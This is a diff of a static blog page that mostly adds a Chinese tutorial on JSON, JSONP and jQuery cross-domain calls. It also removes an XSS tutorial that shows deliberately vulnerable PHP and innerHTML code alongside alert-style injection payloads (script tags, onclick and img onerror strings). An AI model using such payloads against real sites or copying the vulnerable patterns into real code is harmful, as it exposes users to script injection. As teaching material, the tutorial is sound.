@@ -52,9 +52,9 @@
       </nav>
       <nav id="sub-nav">
         
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="Flux RSS"></a>
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Rechercher"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://dodoing.com"></form>
@@ -64,6 +64,130 @@
 </header>
       <div class="outer">
         <section id="main">
+  
+    <article id="post-JSONP的原理，JSON和JSONP区别，也许你会豁然开朗，含jQuery用例" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/11/30/JSONP的原理，JSON和JSONP区别，也许你会豁然开朗，含jQuery用例.html" class="article-date">
+  <time datetime="2016-11-30T09:21:00.000Z" itemprop="datePublished">2016-11-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/11/30/JSONP的原理，JSON和JSONP区别，也许你会豁然开朗，含jQuery用例.html">JSONP的原理，JSON和JSONP区别，也许你会豁然开朗，含jQuery用例</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>前言</p>
+</blockquote>
+<p>说到AJAX就会不可避免的面临两个问题，第一个是AJAX以何种格式来交换数据？第二个是跨域的需求如何解决？</p>
+<p>这两个问题目前都有不同的解决方案，比如数据可以用自定义字符串或者用XML来描述，跨域可以通过服务器端代理来解决。</p>
+<p>但到目前为止最被推崇或者说首选的方案还是用JSON来传数据，靠JSONP来跨域。而这就是本文将要讲述的内容。</p>
+<p>JSON和JSONP虽然只有一个字母的差别，但其实他们根本不是一回事儿：JSON是一种数据交换格式，而JSONP是一种依靠开发人员的聪明才智创造出的一种非官方跨域数据交互协议。</p>
+<p>我们拿最近比较火的谍战片来打个比方，JSON是地下党们用来书写和交换情报的“暗号”，而JSONP则是把用暗号书写的情报传递给自己同志时使用的接头方式。</p>
+<p>看到没？一个是描述信息的格式，一个是信息传递双方约定的方法。</p>
+<p>既然随便聊聊，那我们就不再采用教条的方式来讲述，而是把关注重心放在帮助开发人员理解是否应当选择使用以及如何使用上。</p>
+<blockquote>
+<p>什么是JSON？</p>
+</blockquote>
+<p>前面简单说了一下，JSON是一种基于文本的数据交换方式，或者叫做数据描述格式，你是否该选用他首先肯定要关注它所拥有的优点。</p>
+<p>JSON的优点：</p>
+<ol>
+<li>基于纯文本，跨平台传递极其简单；</li>
+<li>Javascript原生支持，后台语言几乎全部支持；</li>
+<li>轻量级数据格式，占用字符数量极少，特别适合互联网传递；</li>
+<li>可读性较强，虽然比不上XML那么一目了然，但在合理的依次缩进之后还是很容易识别的；</li>
+<li>容易编写和解析，当然前提是你要知道数据结构；</li>
+</ol>
+<p>JSON的缺点当然也有，但在作者看来实在是无关紧要的东西，所以不再单独说明。</p>
+<p>JSON的格式或者叫规则：</p>
+<p>JSON能够以非常简单的方式来描述数据结构，XML能做的它都能做，因此在跨平台方面两者完全不分伯仲。</p>
+<p>1、JSON只有两种数据类型描述符，大括号{}和方括号[]，其余英文冒号:是映射符，英文逗号,是分隔符，英文双引号””是定义符。</p>
+<p>2、大括号{}用来描述一组“不同类型的无序键值对集合”（每个键值对可以理解为OOP的属性描述），方括号[]用来描述一组“相同类型的有序数据集合”（可对应OOP的数组）。</p>
+<p>3、上述两种集合中若有多个子项，则通过英文逗号,进行分隔。</p>
+<p>4、键值对以英文冒号:进行分隔，并且建议键名都加上英文双引号””，以便于不同语言的解析。</p>
+<p>5、JSON内部常用数据类型无非就是字符串、数字、布尔、日期、null 这么几个，字符串必须用双引号引起来，其余的都不用，日期类型比较特殊，这里就不展开讲述了，只是建议如果客户端没有按日期排序功能需求的话，那么把日期时间直接作为字符串传递就好，可以省去很多麻烦。</p>
+<p>JSON实例：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 描述一个人</span></div><div class="line"><span class="keyword">var</span> person = &#123;</div><div class="line">    <span class="string">"Name"</span>: <span class="string">"Bob"</span>,</div><div class="line">    <span class="string">"Age"</span>: <span class="number">32</span>,</div><div class="line">    <span class="string">"Company"</span>: <span class="string">"IBM"</span>,</div><div class="line">    <span class="string">"Engineer"</span>: <span class="literal">true</span></div><div class="line">&#125;</div><div class="line"><span class="comment">// 获取这个人的信息</span></div><div class="line"><span class="keyword">var</span> personAge = person.Age;</div><div class="line"><span class="comment">// 描述几个人</span></div><div class="line"><span class="keyword">var</span> members = [</div><div class="line">    &#123;</div><div class="line">        <span class="string">"Name"</span>: <span class="string">"Bob"</span>,</div><div class="line">        <span class="string">"Age"</span>: <span class="number">32</span>,</div><div class="line">        <span class="string">"Company"</span>: <span class="string">"IBM"</span>,</div><div class="line">        <span class="string">"Engineer"</span>: <span class="literal">true</span></div><div class="line">    &#125;,</div><div class="line">    &#123;</div><div class="line">        <span class="string">"Name"</span>: <span class="string">"John"</span>,</div><div class="line">        <span class="string">"Age"</span>: <span class="number">20</span>,</div><div class="line">        <span class="string">"Company"</span>: <span class="string">"Oracle"</span>,</div><div class="line">        <span class="string">"Engineer"</span>: <span class="literal">false</span></div><div class="line">    &#125;,</div><div class="line">    &#123;</div><div class="line">        <span class="string">"Name"</span>: <span class="string">"Henry"</span>,</div><div class="line">        <span class="string">"Age"</span>: <span class="number">45</span>,</div><div class="line">        <span class="string">"Company"</span>: <span class="string">"Microsoft"</span>,</div><div class="line">        <span class="string">"Engineer"</span>: <span class="literal">false</span></div><div class="line">    &#125;</div><div class="line">]</div><div class="line"><span class="comment">// 读取其中John的公司名称</span></div><div class="line"><span class="keyword">var</span> johnsCompany = members[<span class="number">1</span>].Company;</div><div class="line"><span class="comment">// 描述一次会议</span></div><div class="line"><span class="keyword">var</span> conference = &#123;</div><div class="line">    <span class="string">"Conference"</span>: <span class="string">"Future Marketing"</span>,</div><div class="line">    <span class="string">"Date"</span>: <span class="string">"2012-6-1"</span>,</div><div class="line">    <span class="string">"Address"</span>: <span class="string">"Beijing"</span>,</div><div class="line">    <span class="string">"Members"</span>: </div><div class="line">    [</div><div class="line">        &#123;</div><div class="line">            <span class="string">"Name"</span>: <span class="string">"Bob"</span>,</div><div class="line">            <span class="string">"Age"</span>: <span class="number">32</span>,</div><div class="line">            <span class="string">"Company"</span>: <span class="string">"IBM"</span>,</div><div class="line">            <span class="string">"Engineer"</span>: <span class="literal">true</span></div><div class="line">        &#125;,</div><div class="line">        &#123;</div><div class="line">            <span class="string">"Name"</span>: <span class="string">"John"</span>,</div><div class="line">            <span class="string">"Age"</span>: <span class="number">20</span>,</div><div class="line">            <span class="string">"Company"</span>: <span class="string">"Oracle"</span>,</div><div class="line">            <span class="string">"Engineer"</span>: <span class="literal">false</span></div><div class="line">        &#125;,</div><div class="line">        &#123;</div><div class="line">            <span class="string">"Name"</span>: <span class="string">"Henry"</span>,</div><div class="line">            <span class="string">"Age"</span>: <span class="number">45</span>,</div><div class="line">            <span class="string">"Company"</span>: <span class="string">"Microsoft"</span>,</div><div class="line">            <span class="string">"Engineer"</span>: <span class="literal">false</span></div><div class="line">        &#125;</div><div class="line">    ]</div><div class="line">&#125;</div><div class="line"><span class="comment">// 读取参会者Henry是否工程师</span></div><div class="line"><span class="keyword">var</span> henryIsAnEngineer = conference.Members[<span class="number">2</span>].Engineer;</div></pre></td></tr></table></figure>
+<p>关于JSON，就说这么多，更多细节请在开发过程中查阅资料深入学习。</p>
+<blockquote>
+<p>什么是JSONP？</p>
+</blockquote>
+<p>先说说JSONP是怎么产生的：</p>
+<p>其实网上关于JSONP的讲解有很多，但却千篇一律，而且云里雾里，对于很多刚接触的人来讲理解起来有些困难，小可不才，试着用自己的方式来阐释一下这个问题，看看是否有帮助。</p>
+<p>1、一个众所周知的问题，Ajax直接请求普通文件存在跨域无权限访问的问题，甭管你是静态页面、动态网页、web服务、WCF，只要是跨域请求，一律不准；</p>
+<p>2、不过我们又发现，Web页面上调用js文件时则不受是否跨域的影响（不仅如此，我们还发现凡是拥有”src”这个属性的标签都拥有跨域的能力，比如<script>、<img>、<iframe>）；</p>
+<p>3、于是可以判断，当前阶段如果想通过纯web端（ActiveX控件、服务端代理、属于未来的HTML5之Websocket等方式不算）跨域访问数据就只有一种可能，那就是在远程服务器上设法把数据装进js格式的文件里，供客户端调用和进一步处理；</p>
+<p>4、恰巧我们已经知道有一种叫做JSON的纯字符数据格式可以简洁的描述复杂数据，更妙的是JSON还被js原生支持，所以在客户端几乎可以随心所欲的处理这种格式的数据；</p>
+<p>5、这样子解决方案就呼之欲出了，web客户端通过与调用脚本一模一样的方式，来调用跨域服务器上动态生成的js格式文件（一般以JSON为后缀），显而易见，服务器之所以要动态生成JSON文件，目的就在于把客户端需要的数据装入进去。</p>
+<p>6、客户端在对JSON文件调用成功之后，也就获得了自己所需的数据，剩下的就是按照自己需求进行处理和展现了，这种获取远程数据的方式看起来非常像AJAX，但其实并不一样。</p>
+<p>7、为了便于客户端使用数据，逐渐形成了一种非正式传输协议，人们把它称作JSONP，该协议的一个要点就是允许用户传递一个callback参数给服务端，然后服务端返回数据时会将这个callback参数作为函数名来包裹住JSON数据，这样客户端就可以随意定制自己的函数来自动处理返回数据了。</p>
+<p>如果对于callback参数如何使用还有些模糊的话，我们后面会有具体的实例来讲解。</p>
+<hr>
+<blockquote>
+<p><strong>JSONP的客户端具体实现</strong></p>
+</blockquote>
+<p>不管jQuery也好，extjs也罢，又或者是其他支持jsonp的框架，他们幕后所做的工作都是一样的，下面我来循序渐进的说明一下jsonp在客户端的实现：</p>
+<p>1、我们知道，哪怕跨域js文件中的代码（当然指符合web脚本安全策略的），web页面也是可以无条件执行的。</p>
+<p>远程服务器remoteserver.com根目录下有个remote.js文件代码如下：</p>
+<p><code>alert(&#39;我是远程文件&#39;);</code></p>
+<p>本地服务器localserver.com下有个jsonp.html页面代码如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://remoteserver.com/remote.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>毫无疑问，页面将会弹出一个提示窗体，显示跨域调用成功。</p>
+<p>2、现在我们在jsonp.html页面定义一个函数，然后在远程remote.js中传入数据进行调用。</p>
+<p>jsonp.html页面代码如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></div><div class="line">    <span class="keyword">var</span> localHandler = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</div><div class="line">        alert(<span class="string">'我是本地函数，可以被跨域的remote.js文件调用，远程js带来的数据是：'</span> + data.result);</div><div class="line">    &#125;;</div><div class="line">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://remoteserver.com/remote.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>remote.js文件代码如下：</p>
+<p><code>localHandler({&quot;result&quot;:&quot;我是远程js带来的数据&quot;});</code></p>
+<p>运行之后查看结果，页面成功弹出提示窗口，显示本地函数被跨域的远程js调用成功，并且还接收到了远程js带来的数据。</p>
+<p>很欣喜，跨域远程获取数据的目的基本实现了，但是又一个问题出现了，我怎么让远程js知道它应该调用的本地函数叫什么名字呢？毕竟是jsonp的服务者都要面对很多服务对象，而这些服务对象各自的本地函数都不相同啊？我们接着往下看。</p>
+<p>3、聪明的开发者很容易想到，只要服务端提供的js脚本是动态生成的就行了呗，这样调用者可以传一个参数过去告诉服务端“我想要一段调用XXX函数的js代码，请你返回给我”，于是服务器就可以按照客户端的需求来生成js脚本并响应了。</p>
+<p>看jsonp.html页面的代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></div><div class="line">    <span class="comment">// 得到航班信息查询结果后的回调函数</span></div><div class="line">    <span class="keyword">var</span> flightHandler = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</div><div class="line">        alert(<span class="string">'你查询的航班结果是：票价 '</span> + data.price + <span class="string">' 元，'</span> + <span class="string">'余票 '</span> + data.tickets + <span class="string">' 张。'</span>);</div><div class="line">    &#125;;</div><div class="line">    <span class="comment">// 提供jsonp服务的url地址（不管是什么类型的地址，最终生成的返回值都是一段javascript代码）</span></div><div class="line">    <span class="keyword">var</span> url = <span class="string">"http://flightQuery.com/jsonp/flightResult.aspx?code=CA1998&amp;callback=flightHandler"</span>;</div><div class="line">    <span class="comment">// 创建script标签，设置其属性</span></div><div class="line">    <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</div><div class="line">    script.setAttribute(<span class="string">'src'</span>, url);</div><div class="line">    <span class="comment">// 把script标签加入head，此时调用开始</span></div><div class="line">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>].appendChild(script); </div><div class="line">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>这次的代码变化比较大，不再直接把远程js文件写死，而是编码实现动态查询，而这也正是jsonp客户端实现的核心部分，本例中的重点也就在于如何完成jsonp调用的全过程。</p>
+<p>我们看到调用的url中传递了一个code参数，告诉服务器我要查的是CA1998次航班的信息，而callback参数则告诉服务器，我的本地回调函数叫做flightHandler，所以请把查询结果传入这个函数中进行调用。</p>
+<p>OK，服务器很聪明，这个叫做flightResult.aspx的页面生成了一段这样的代码提供给jsonp.html（服务端的实现这里就不演示了，与你选用的语言无关，说到底就是拼接字符串）：</p>
+<p><code>flightHandler({
+    &quot;code&quot;: &quot;CA1998&quot;,
+    &quot;price&quot;: 1780,
+    &quot;tickets&quot;: 5
+});</code></p>
+<p>我们看到，传递给flightHandler函数的是一个json，它描述了航班的基本信息。运行一下页面，成功弹出提示窗口，jsonp的执行全过程顺利完成！</p>
+<p>4、到这里为止的话，相信你已经能够理解jsonp的客户端实现原理了吧？剩下的就是如何把代码封装一下，以便于与用户界面交互，从而实现多次和重复调用。</p>
+<p>什么？你用的是jQuery，想知道jQuery如何实现jsonp调用？好吧，那我就好人做到底，再给你一段jQuery使用jsonp的代码（我们依然沿用上面那个航班信息查询的例子，假定返回jsonp结果不变）：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Untitled Page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">     <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">jquery.min.js</span>"&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">     <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></div><div class="line">    jQuery(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; </div><div class="line">       $.ajax(&#123;</div><div class="line">            <span class="attr">type</span>: <span class="string">"get"</span>,</div><div class="line">            <span class="attr">async</span>: <span class="literal">false</span>,</div><div class="line">            <span class="attr">url</span>: <span class="string">"http://flightQuery.com/jsonp/flightResult.aspx?code=CA1998"</span>,</div><div class="line">            <span class="attr">dataType</span>: <span class="string">"jsonp"</span>,</div><div class="line">            <span class="attr">jsonp</span>: <span class="string">"callback"</span>,<span class="comment">//传递给请求处理程序或页面的，用以获得jsonp回调函数名的参数名(一般默认为:callback)</span></div><div class="line">            jsonpCallback:<span class="string">"flightHandler"</span>,<span class="comment">//自定义的jsonp回调函数名称，默认为jQuery自动生成的随机函数名，也可以写"?"，jQuery会自动为你处理数据</span></div><div class="line">            success: <span class="function"><span class="keyword">function</span>(<span class="params">json</span>)</span>&#123;</div><div class="line">                alert(<span class="string">'您查询到航班信息：票价： '</span> + json.price + <span class="string">' 元，余票： '</span> + json.tickets + <span class="string">' 张。'</span>);</div><div class="line">            &#125;,</div><div class="line">            <span class="attr">error</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">                alert(<span class="string">'fail'</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;);</div><div class="line">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>是不是有点奇怪？</p>
+<p>为什么我这次没有写flightHandler这个函数呢？而且竟然也运行成功了！</p>
+<p>哈哈，这就是jQuery的功劳了，jquery在处理jsonp类型的ajax时（还是忍不住吐槽，虽然jquery也把jsonp归入了ajax，但其实它们真的不是一回事儿），自动帮你生成回调函数并把数据取出来供success属性方法来调用，是不是很爽呀？</p>
+<p>ajax和jsonp其实本质上是不同的东西。ajax的核心是通过XmlHttpRequest获取非本页内容，而jsonp的核心则是动态添加<script>标签来调用服务器提供的js脚本。</p>
+<p>所以说，其实ajax与jsonp的区别不在于是否跨域，ajax通过服务端代理一样可以实现跨域，jsonp本身也不排斥同域的数据的获取。</p>
+<p>还有就是，jsonp是一种方式或者说非强制性协议，如同ajax一样，它也不一定非要用json格式来传递数据，如果你愿意，字符串都行，只不过这样不利于用jsonp提供公开服务。</p>
+<p>-摘自于  <a href="http://www.cnblogs.com/dowinning/archive/2012/04/19/json-jsonp-jquery.html" title="cnblogs">cnblogs</a></p>
+</script></p>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://dodoing.com/2016/11/30/JSONP的原理，JSON和JSONP区别，也许你会豁然开朗，含jQuery用例.html" data-id="cj4t5x1fc001kyke9q0w8we63" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/javascript/">javascript</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
   
     <article id="post-前端开发的历史和趋势" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -289,7 +413,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://dodoing.com/2016/11/25/前端开发的历史和趋势.html" data-id="cj4ruszur0014v0e973dhy4ns" class="article-share-link">Partager</a>
+      <a data-url="http://dodoing.com/2016/11/25/前端开发的历史和趋势.html" data-id="cj4t5x1ew0016yke9al6hdint" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/javascript/">javascript</a></li></ul>
@@ -356,146 +480,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://dodoing.com/2016/11/22/js的执行过程，预解析与执行.html" data-id="cj4ruszu8000ov0e9o1agueu9" class="article-share-link">Partager</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/javascript/">javascript</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-带你玩转跨站脚本攻击cross site script" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2016/11/18/带你玩转跨站脚本攻击cross site script.html" class="article-date">
-  <time datetime="2016-11-18T01:56:00.000Z" itemprop="datePublished">2016-11-18</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/11/18/带你玩转跨站脚本攻击cross site script.html">带你玩转跨站脚本攻击cross site script</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>跨站脚本攻击 cross site script</p>
-</blockquote>
-<pre><code>通常指黑客通过“HTML注入”纂改了页面，插入了恶意的脚本，从而在用户浏览页面时，控制用户浏览器的一种攻击。在一开始，这种攻击的演示案例是跨域的，所以叫“跨站脚本”。但是发展到今天，由于Javascript的强大功能以及网站前端应用的复杂化，是否跨域已经不再重要。但是由于历史原因，这个名字保留了下来。
-</code></pre><p>假设一个页面把用户输入的参数输出到页面上：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$input=$_GET[“param”];</div><div class="line"><span class="keyword">echo</span> “&lt;div&gt;”.$input.”&lt;/div&gt;”;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>如果提交一段HTML代码:</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://inqiu.com/test.php?param=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
-<p>会发现alert(/xss/)被执行了。</p>
-<p>XSS分为以下几类:</p>
-<ol>
-<li><p>反射型XSS: 只是简单地把用户输入的数据反射给浏览器，黑客需要诱使用户点击链接。也叫作”非持久型XSS“(Non-persistent XSS)</p>
-</li>
-<li><p>存储型XSS:把用户输入的数据”存储“在服务器端。这种XSS具有很强的稳定性。 比较常见的一个场景是，黑客写下一篇包含恶意Javascript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的Javascript代        码。黑客把恶意的脚本保存在服务器端，所以中XSS攻击就叫做”存储型XSS”。存储型XSS也叫持久性XSS</p>
-</li>
-<li><p>DOM based XSS:从效果上来说也是一种反射型XSS。通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。</p>
-</li>
-</ol>
-<p>看如下代码:</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line">function test()&#123;</div><div class="line">var str=document.getElementById(“text”).value;</div><div class="line">document.getElementById(“t”).innerHTML=”&lt;a href='”+str+”‘ &gt;testLink&lt;/a&gt;”;</div><div class="line">&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">”t”</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”text”</span> <span class="attr">id</span>=<span class="string">”text”</span> <span class="attr">value</span>=<span class="string">””</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”button”</span> <span class="attr">id</span>=<span class="string">”s”</span> <span class="attr">value</span>=<span class="string">”write”</span> <span class="attr">onlick</span>=<span class="string">”test()”</span> /&gt;</span></div></pre></td></tr></table></figure>
-<p>这段代码的作用就是点击write按钮后在当前页面插入一个链接。</p>
-<p>在test()函数中，修改了页面的DOM节点，通过innerHTML把一段用户数据当作HTML写入到页面中，这就造成了DOM based XSS</p>
-<p>构造如下数据:<br>‘ onclick=alert(/xss/) //</p>
-<p>输入后，页面代码就成了</p>
-<p><a href="”" onlick="alert(/xss/)" ’="">testLink </a></p>
-<p>首先用一个单引号闭合掉href的第一个单引号，然后插入一个onclick事件，最后再用注释符//注释掉第二个单引号。 这里为什么需要onclick，是通过on事件触发？</p>
-<p>实际上，这里还有另外一种利用方式—除了构造一个新事件外，还可以选择闭合掉&lt; a &gt;标签，并插入一个新的HTML标签。尝试如下输入:</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">‘&gt;&lt;img scr=# onerror=alert(/xss2/) /&gt;&lt;‘</div><div class="line"></div><div class="line">//页面代码编程</div><div class="line"></div><div class="line">&lt;a href=”&gt;&lt;img scr=# onerror=alert(/xss2/) /&gt;&lt;”&gt;testLink&lt;/a&gt; // 这里是onerror事件</div></pre></td></tr></table></figure>
-<blockquote>
-<p>XSS攻击进阶:</p>
-</blockquote>
-<p>1)初探XSS Payload:</p>
